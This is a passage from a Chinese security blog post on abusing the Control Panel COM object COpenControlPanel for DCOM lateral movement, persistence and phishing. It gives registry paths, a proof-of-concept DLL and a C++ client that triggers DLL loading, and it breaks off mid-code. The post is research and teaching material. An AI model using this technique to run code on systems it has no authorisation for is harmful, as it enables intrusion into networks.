@@ -1,0 +1,210 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>利用控制面板COM对象实现内网横向移动的新型DCOM攻击技术 | 卡卡罗特取西经</title><meta name="author" content="ybdt"><meta name="copyright" content="ybdt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="前言上一篇文章介绍了Impacket中dcomexec.py的工作原理，以及在Windows Server 2025中如何绕过Microsoft Defender Antivirus，本文会介绍一种新的和控制面板相关的COM对象，用于内网横向命令执行 这个COM对象之前也被用于社工钓鱼和权限维持，本文会先介绍它在社工钓鱼和权限维持中的应用，然后介绍它如何应用在内网横向命令执行，最后介绍如何检测以及">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用控制面板COM对象实现内网横向移动的新型DCOM攻击技术">
+<meta property="og:url" content="http://example.com/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="卡卡罗特取西经">
+<meta property="og:description" content="前言上一篇文章介绍了Impacket中dcomexec.py的工作原理，以及在Windows Server 2025中如何绕过Microsoft Defender Antivirus，本文会介绍一种新的和控制面板相关的COM对象，用于内网横向命令执行 这个COM对象之前也被用于社工钓鱼和权限维持，本文会先介绍它在社工钓鱼和权限维持中的应用，然后介绍它如何应用在内网横向命令执行，最后介绍如何检测以及">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2026-01-13T04:23:40.000Z">
+<meta property="article:modified_time" content="2026-01-13T04:24:34.819Z">
+<meta property="article:author" content="ybdt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '利用控制面板COM对象实现内网横向移动的新型DCOM攻击技术',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-01-13 12:24:34'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="卡卡罗特取西经" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="卡卡罗特取西经"><span class="site-name">卡卡罗特取西经</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">利用控制面板COM对象实现内网横向移动的新型DCOM攻击技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-13T04:23:40.000Z" title="Created 2026-01-13 12:23:40">2026-01-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-13T04:24:34.819Z" title="Updated 2026-01-13 12:24:34">2026-01-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/">内网横向</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="利用控制面板COM对象实现内网横向移动的新型DCOM攻击技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一篇文章介绍了Impacket中dcomexec.py的工作原理，以及在Windows Server 2025中如何绕过Microsoft Defender Antivirus，本文会介绍一种新的和控制面板相关的COM对象，用于内网横向命令执行</p>
+<p>这个COM对象之前也被用于社工钓鱼和权限维持，本文会先介绍它在社工钓鱼和权限维持中的应用，然后介绍它如何应用在内网横向命令执行，最后介绍如何检测以及阻止这类攻击</p>
+<p>本文使用的测试环境：Windows 10 22H2 19045.6466、Kali 2025.3 x64</p>
+<h1 id="控制面板作为攻击面"><a href="#控制面板作为攻击面" class="headerlink" title="控制面板作为攻击面"></a>控制面板作为攻击面</h1><p>控制面板允许我们调整计算机设置，如下图，每一个控制面板项的实体后缀为cpl，本质是一个EXE或者DLL，，其中DLL会导出一个名为CPIApplet的函数，本文主要讨论实体为DLL的项<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/01.png" alt="image"></p>
+<p>通过DIE也能看到CPL文件本质就是DLL<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/01.1.png" alt="image"></p>
+<p>可在cmd下通过control.exe执行控制面板项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">control.exe yourfile.cpl</span><br></pre></td></tr></table></figure>
+<p>底层是通过rundll32调用shell32.dll中的函数Control_RunDLL，传入yourfile.cpl作为参数，yourfile.cpl中的CPIApplet将被执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe shell32.dll,Control_RunDLL yourfile.cpl</span><br></pre></td></tr></table></figure>
+
+<p>由于普通用户并不知道cpl也是可执行文件，所以有些APT组织在社工钓鱼中用它作为恶意附件，已被收录到ATT&amp;CK中的：<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/002/">https://attack.mitre.org/techniques/T1218/002/</a></p>
+<p>ATT&amp;CK中提到了，一个dll即使没遵守cpl规范、没导出CPIApplet、后缀也不是cpl，只要在下述注册表位置注册它，也能被执行（通过dll入口函数DllMain）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Under HKCU:</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</span><br><span class="line"></span><br><span class="line">Under HKLM For 64-bit DLLs</span><br><span class="line">HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</span><br><span class="line"></span><br><span class="line">Under HKLM for 32-bit DLLs:</span><br><span class="line">HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</span><br></pre></td></tr></table></figure>
+<p>想让当前用户生效，就用HKCU下的位置，想让这台机器上所有用户生效，就用HKLM下的位置</p>
+<p>在Win10中打开上述注册表位置后，会发现HKCU下的Control Panel及子项Cpls并没有，需要你手动创建，HKLM下的Control Panel\Cpls默认就有</p>
+<p>我们写一个简单的dll demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBox(NULL, TEXT(&quot;DLL has been load by process!&quot;), TEXT(&quot;SimpleDLL&quot;), MB_OK | MB_ICONINFORMATION);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) void Hello()</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(NULL, TEXT(&quot;Hello from export function!&quot;), TEXT(&quot;SimpleDLL&quot;), MB_OK | MB_ICONINFORMATION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将上述dll编译后重命名为cpl，注册到下图所示注册表位置，当打开控制面板，代码被执行<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/02.png" alt="image"></p>
+<p>使用Process Explorer跟踪一下，可以看到cpl文件都将被DLL Surrogate Process（dllhost.exe）载入到内存<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/03.png" alt="image"></p>
+<p>重点来了，熟悉COM对象的同学可能会注意到，dllhost是COM对象的托管进程，那是不是说shell32.dll中的Control_RunDLL是一个COM客户端，它调用COM服务器执行DllTest.cpl</p>
+<p>这里简单介绍一下，COM服务器的执行有三种形式：</p>
+<ol>
+<li>独立的EXE形式，执行时进程就是EXE的进程</li>
+<li>DLL形式，执行时被载入到COM客户端进程中</li>
+<li>DLL形式，执行时被载入到DLL代理进程（dllhost.exe）中</li>
+</ol>
+<p>所以看到dllhost.exe会想到COM对象</p>
+<h1 id="控制面板实现横向移动"><a href="#控制面板实现横向移动" class="headerlink" title="控制面板实现横向移动"></a>控制面板实现横向移动</h1><p>使用OleViewDotNet查看shell32.dll中和控制面板相关的COM对象时，发现一个名为COpenControlPanel的COM对象，CLSID为{06622D85-6856-4460-8DE1-A81921B41C4B}，这个对象暴露了多个接口，其中一个是IID为{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}的IOpenControlPanel，如下图<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/04.png" alt="image"></p>
+<p>然后想看它实现的方法，发现这些接口并没有绑定TypeLib<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/05.png" alt="image"></p>
+<p>好在从MSDN文档中发现了定义：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iopencontrolpanel">https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iopencontrolpanel</a></p>
+<p>需要注意，在Windows Server 2025和Windows 11中，移除了这个COM对象的名字，也就是说无法通过OleViewDotNet查看名为COpenControlPanel的COM对象，在显示名字的地方变成了CLSID</p>
+<p>文档中提到，这个COM对象提供了3个方法，其中的第三个方法Open用来打开一个控制面板项，那是不是说，不需要手动打开控制面板，只要调用这个函数就能触发上面的demo dll被执行</p>
+<p>函数Open定义如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HRESULT Open(</span><br><span class="line">  [in] LPCWSTR  pszName,</span><br><span class="line">  [in] LPCWSTR  pszPage,</span><br><span class="line">  [in] IUnknown *punkSite</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>我们来实现一个COM客户端，尝试调用COpenControlPanel中的Open函数打开控制面板，代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;shobjidl.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    HRESULT hr;</span><br><span class="line"></span><br><span class="line">    // 初始化COM运行环境</span><br><span class="line">    hr = CoInitialize(NULL);</span><br><span class="line">    if (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;[-] COM初始化失败！HRESULT: 0x&quot; &lt;&lt; std::hex &lt;&lt; hr &lt;&lt; std::endl;</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; &quot;[+] COM初始化成功&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    // 创建COM对象COpenControlPanel</span><br><span class="line">    IOpenControlPanel* pOCP = NULL;</span><br><span class="line">    hr = CoCreateInstance(</span><br><span class="line">        CLSID_OpenControlPanel,</span><br><span class="line">        NULL,</span><br><span class="line">        CLSCTX_INPROC_SERVER,</span><br><span class="line">        IID_IOpenControlPanel,</span><br><span class="line">        (void**)&amp;pOCP</span><br><span class="line">    );</span><br><span class="line">    if (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;[-] COM对象COpenControlPanel创建失败！HRESULT: 0x&quot; &lt;&lt; std::hex &lt;&lt; hr &lt;&lt; std::endl;</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; &quot;[+] COM对象COpenControlPanel创建成功&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    // 调用方法Open</span><br><span class="line">    // https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iopencontrolpanel</span><br><span class="line">    LPCWSTR panelName = L&quot;&quot;;</span><br><span class="line">    hr = pOCP-&gt;Open(</span><br><span class="line">        panelName,</span><br><span class="line">        NULL,</span><br><span class="line">        NULL</span><br><span class="line">    );</span><br><span class="line">    if (SUCCEEDED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; &quot;[+] 成功打开控制面板首页&quot; &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;[-] 打开控制面板失败！HRESULT: 0x&quot; &lt;&lt; std::hex &lt;&lt; hr &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 释放COM对象并销毁COM运行环境</span><br><span class="line">    pOCP-&gt;Release();</span><br><span class="line">    std::cout &lt;&lt; &quot;[+] COM对象已释放&quot; &lt;&lt; std::endl;</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    std::cout &lt;&lt; &quot;[+] COM运行环境已销毁&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，在尝试打开控制面板时，触发了之前注册的dll被执行，显示打开控制面板失败是因为我们对panelName传入了空字符串，但不影响注册的dll被执行<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/06.png" alt="image"></p>
+<p>目前为止，我们捋一捋，cpl文件不需要有导出函数CPIApplet，只要在注册表中注册，COM客户端调用COM服务端COpenControlPanel中的Open时，就能触发DllMain中的代码被执行，那我们能不能远程调用这个COpenControlPanel中的Open？再配合将dll上传到远程主机、以及远程注册表操作，不就实现了一种新型DCOM</p>
+<p>现在万事俱备，只欠这个COM对象能否被远程调用，我们查看下它的AppID和相应的权限，可以看到，它有AppID，激活权限和访问权限均为空也就是使用默认值，换句话说，默认情况下管理员组中的成员都可以激活和访问这个COM对象<br><img src="/2026/01/13/%E5%88%A9%E7%94%A8%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BFCOM%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E6%96%B0%E5%9E%8BDCOM%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/07.png" alt="image"></p>
+<p>远程调用COM对象时，位于Session 0会话下，弹窗就不会显示了，甚至可能会造成死锁，所以要改下代码，将弹窗改为写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">                     )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        // MessageBox(NULL, TEXT(&quot;DLL has been load by process!&quot;), TEXT(&quot;SimpleDLL&quot;), MB_OK | MB_ICONINFORMATION);</span><br><span class="line">        &#123;</span><br><span class="line">            LPCWSTR filePath = L&quot;C:\\Users\\Public\\ybdt.txt&quot;;</span><br><span class="line">            const char* data = &quot;Hello, Ybdt!&quot;;</span><br><span class="line">            DWORD bytesWritten = 0;</span><br><span class="line">            HANDLE hFile = CreateFileW(</span><br><span class="line">                filePath,</span><br><span class="line">                GENERIC_WRITE,</span><br><span class="line">                0,</span><br><span class="line">                NULL,</span><br><span class="line">                CREATE_ALWAYS,</span><br><span class="line">                FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">                NULL</span><br><span class="line">            );</span><br><span class="line">            if (hFile != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">                WriteFile(hFile, data, strlen(data), &amp;bytesWritten, NULL);</span><br><span class="line">                CloseHandle(hFile);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) void Hello()</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(NULL, TEXT(&quot;Hello from export function!&quot;), TEXT(&quot;SimpleDLL&quot;), MB_OK | 